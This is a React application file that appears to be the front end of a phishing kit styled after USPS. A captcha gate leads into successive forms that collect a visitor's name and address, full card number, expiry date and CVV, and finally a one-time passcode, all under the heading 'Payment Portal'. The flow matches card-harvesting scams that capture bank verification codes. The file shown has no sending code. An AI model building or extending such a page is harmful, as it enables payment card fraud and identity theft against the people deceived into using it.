import './styles/uspsStyles.css';
import React, { useState, useEffect } from 'react';
import CaptchaGate from './components/CaptchaGate';
import AddressForm from './components/AddressForm';
import PaymentForm from './components/PaymentForm';
import OtpForm from './components/OtpForm';

function App() {
  const [step, setStep] = useState('captcha');
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    country: '',
    address: '',
    zipCode: '',
    city: '',
    cardNumber: '',
    expirationDate: '',
    cvv: '',
    otp: '',
  });
  const [error, setError] = useState('');

  useEffect(() => {
    if (sessionStorage.getItem('captchaVerified') === 'true') {
      setStep('address');
    }
  }, []);

  const handleCaptchaVerified = () => {
    sessionStorage.setItem('captchaVerified', 'true');
    setStep('address');
  };

  const nextStep = () => {
    if (step === 'address') setStep('payment');
    else if (step === 'payment') setStep('otp');
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  return (
    <div className="app-container">
      {step === 'captcha' ? (
        <CaptchaGate onVerified={handleCaptchaVerified} />
      ) : (
        <div className="content">
          <header>
            <h1>Payment Portal</h1>
          </header>

          {error && <p className="error-message">{error}</p>}

          {step === 'address' && (
            <AddressForm formData={formData} handleChange={handleChange} nextStep={nextStep} error={error} setError={setError} />
          )}

          {step === 'payment' && (
            <PaymentForm formData={formData} handleChange={handleChange} nextStep={nextStep} setError={setError} />
          )}

          {step === 'otp' && (
            <OtpForm formData={formData} handleChange={handleChange} setError={setError} />
          )}
        </div>
      )}
    </div>
  );
}

export default App;
